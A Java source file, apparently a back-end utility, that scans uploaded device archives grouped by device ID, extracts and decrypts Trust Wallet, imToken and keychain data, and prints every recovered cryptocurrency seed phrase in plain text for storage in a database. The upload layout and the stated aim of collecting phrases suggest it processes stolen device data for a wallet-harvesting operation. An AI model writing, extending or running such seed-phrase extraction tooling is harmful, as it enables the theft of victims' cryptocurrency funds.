package com.consumer.parse;

import java.lang.reflect.Field;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

import org.apache.commons.lang3.StringUtils;

import com.consumer.util.Bip39Util;
import com.consumer.util.UploadPaths;

/**
 * 离线对照：用 Java 自动解析栈扫指定设备目录，打印能入库的助记词。
 */
public final class LocalDeviceScanMain {

    public static void main(String[] args) throws Exception {
        String uploadDir = args.length > 0 ? args[0] : "D:/v26_records/uploads";
        String date = args.length > 1 ? args[1] : "2026-09-16";
        String did = args.length > 2 ? args[2] : "2c18a61b-8d0f-4371-bbd1-b26deb19c4a3";
        Path folder = Paths.get(uploadDir, date, did);
        System.out.println("java dir=" + folder);

        Bip39Util bip39 = new Bip39Util();
        Field f = Bip39Util.class.getDeclaredField("uploadDir");
        f.setAccessible(true);
        f.set(bip39, uploadDir);
        bip39.init();

        WalletInspect inspect = new WalletInspect(bip39);
        NotesParse notes = new NotesParse();
        ArchiveScanner scanner = new ArchiveScanner(inspect, notes);
        KeychainParse keychainParse = new KeychainParse(bip39);
        TrustWallet trustWallet = new TrustWallet(bip39);
        ImTokenWallet imTokenWallet = new ImTokenWallet();

        List<Path> tars = new ArrayList<>();
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(folder)) {
            for (Path p : ds) {
                if (!Files.isRegularFile(p) || Files.size(p) <= 0) {
                    continue;
                }
                String name = p.getFileName().toString();
                if (!WalletMatcher.isArchive(name)) {
                    continue;
                }
                tars.add(p);
            }
        }
        tars.sort((a, b) -> WalletMatcher.preferOriginalArchive(
                a.getFileName().toString(), b.getFileName().toString()));

        List<WalletDisplay> items = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        Set<String> seenCanon = new LinkedHashSet<>();
        for (Path path : tars) {
            String fname = path.getFileName().toString();
            if (seen.contains(fname)) {
                continue;
            }
            if (!WalletMatcher.isCoreExportName(fname) && WalletMatcher.classifyV2(fname) == null) {
                continue;
            }
            String canon = WalletMatcher.canonicalArchiveName(fname).toLowerCase(Locale.ROOT);
            if (!seenCanon.add(canon)) {
                continue;
            }
            seen.add(fname);
            if (WalletMatcher.isCoreExportName(fname)) {
                items.addAll(scanner.scanCoreExport(did, fname, path));
            } else {
                items.addAll(scanner.scanFile(did, fname, path));
            }
        }
        System.out.println("java archives=" + tars.size() + " scanned=" + seenCanon.size());

        Path kc = UploadPaths.findDeviceKeychain(uploadDir, did);
        Map<String, KeychainParse.WalletHit> hits = kc == null
                ? new LinkedHashMap<>()
                : keychainParse.extract(kc);
        mergeKeychain(items, hits, trustWallet);
        List<WalletDisplay> displays = expandImToken(items, imTokenWallet);

        Map<String, String[]> unique = new LinkedHashMap<>();
        System.out.println("--- java displays ---");
        for (WalletDisplay d : displays) {
            String ph = StringUtils.trimToEmpty(d.getPhrase());
            System.out.println("  wallet=" + d.getWalletKey() + " file=" + d.getSourceFile()
                    + " phrase=" + (ph.isEmpty() ? "N" : "Y")
                    + " account=" + StringUtils.defaultString(d.getAccountName()));
            if (ph.isEmpty()) {
                continue;
            }
            for (String text : splitPhrases(ph)) {
                String h = sha256(text);
                unique.putIfAbsent(h, new String[] {text, d.getWalletKey()});
            }
        }
        System.out.println("java phrase_rows=" + unique.size());
        int i = 0;
        for (Map.Entry<String, String[]> e : unique.entrySet()) {
            i++;
            String[] item = e.getValue();
            String[] words = item[0].split("\\s+");
            System.out.println("  [" + i + "] hash=" + e.getKey().substring(0, 16)
                    + " wallet=" + item[1] + " words=" + words.length + " text=" + item[0]);
        }
    }

    private static List<WalletDisplay> expandImToken(List<WalletDisplay> items, ImTokenWallet imTokenWallet) {
        List<WalletDisplay> out = new ArrayList<>();
        for (WalletDisplay w : items) {
            if ("imtoken".equals(w.getWalletKey())) {
                out.addAll(imTokenWallet.expand(w));
            } else {
                out.add(w);
            }
        }
        return out;
    }

    private static void mergeKeychain(List<WalletDisplay> items, Map<String, KeychainParse.WalletHit> hits,
            TrustWallet trustWallet) {
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey())) {
                KeychainParse.WalletHit hit = hits.get(w.getWalletKey());
                Map<String, String> utc = hit == null ? new LinkedHashMap<>() : hit.getUtcPasswords();
                List<String> recovered = trustWallet.recover(w.getArchivePath(), w.getArchiveRoots(), utc);
                if (recovered != null && !recovered.isEmpty()) {
                    w.setPhrase(String.join("\n", recovered));
                    w.setStatusOk(true);
                }
            }
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey()) && StringUtils.isNotBlank(w.getPhrase())) {
                continue;
            }
            KeychainParse.WalletHit hit = hits.get(w.getWalletKey());
            if (hit == null || hit.getPhrases() == null || hit.getPhrases().isEmpty()) {
                continue;
            }
            w.setPhrase(String.join("\n", hit.getPhrases()));
            w.setStatusOk(true);
        }
        Set<String> seenKeys = new LinkedHashSet<>();
        for (WalletDisplay w : items) {
            if (StringUtils.isNotBlank(w.getWalletKey())) {
                seenKeys.add(w.getWalletKey());
            }
        }
        for (Map.Entry<String, KeychainParse.WalletHit> e : hits.entrySet()) {
            if (seenKeys.contains(e.getKey()) || e.getValue().getPhrases() == null
                    || e.getValue().getPhrases().isEmpty()) {
                continue;
            }
            List<String> phrases = e.getValue().getPhrases();
            WalletDisplay d = new WalletDisplay();
            d.setName(WalletMatcher.walletTitle(e.getKey()));
            d.setSourceFile("keychain.xml");
            d.setWalletKey(e.getKey());
            d.setPhrase(String.join("\n", phrases));
            d.setStatusOk(true);
            items.add(d);
        }
    }

    private static List<String> splitPhrases(String phrase) {
        List<String> out = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (String line : StringUtils.defaultString(phrase).split("\\r?\\n")) {
            String text = line.trim().replaceAll("\\s+", " ").toLowerCase(Locale.ROOT);
            if (text.split("\\s+").length < 12) {
                continue;
            }
            if (seen.add(text)) {
                out.add(text);
            }
        }
        return out;
    }

    private static String sha256(String text) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(text.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return text;
        }
    }
}
